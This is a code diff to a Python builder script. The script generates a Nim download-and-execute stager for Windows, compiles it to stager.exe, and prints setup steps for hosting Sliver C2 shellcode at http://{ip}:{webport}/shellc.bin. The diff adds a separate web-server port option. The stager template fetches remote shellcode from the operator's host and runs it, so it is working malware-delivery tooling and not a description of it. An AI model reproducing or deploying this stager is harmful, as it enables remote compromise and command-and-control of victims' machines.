@@ -29,7 +29,7 @@ proc DownloadExecute(url: string): void =
 
 when defined(windows):
   when isMainModule:
-    DownloadExecute("http://{ip}:{port}/shellc.bin")
+    DownloadExecute("http://{ip}:{webport}/shellc.bin")
 """
 
 def run_cmd(cmd, description):
@@ -70,13 +70,14 @@ def main():
     
     parser.add_argument("-l", "--ip", required=True, help="The listener IP address")
     parser.add_argument("-p", "--port", required=True, help="The listener port")
+    parser.add_argument("-w", "--webport", required=True, help="The web server port for serving shellcode")
     args = parser.parse_args()
 
     # 1. Generate the Nim source file
-    print(f"[*] Formatting stager.nim for {args.ip}:{args.port}...")
+    print(f"[*] Formatting stager.nim for {args.ip}:{args.port} (web server on port {args.webport})...")
     try:
         with open("stager.nim", "w") as f:
-            f.write(NIM_TEMPLATE.format(ip=args.ip, port=args.port))
+            f.write(NIM_TEMPLATE.format(ip=args.ip, port=args.port, webport=args.webport))
     except Exception as e:
         print(f"[!] Failed to write file: {e}")
         sys.exit(1)
@@ -110,7 +111,11 @@ def main():
         print(f"    {sliver_cmd}")
         
         print("\n[!] After generating, ensure the file is named 'shellc.bin' and")
-        print(f"    hosted at http://{args.ip}:{args.port}/shellc.bin")
+        print(f"    hosted at http://{args.ip}:{args.webport}/shellc.bin")
+        print(f"\n[!] Listener Configuration:")
+        print(f"    - Listener IP: {args.ip}")
+        print(f"    - Listener Port: {args.port}")
+        print(f"    - Web Server Port (shellcode): {args.webport}")
         print("="*60 + "\n")
     else:
         print("\n[!] Build failed: stager.exe was not produced.")
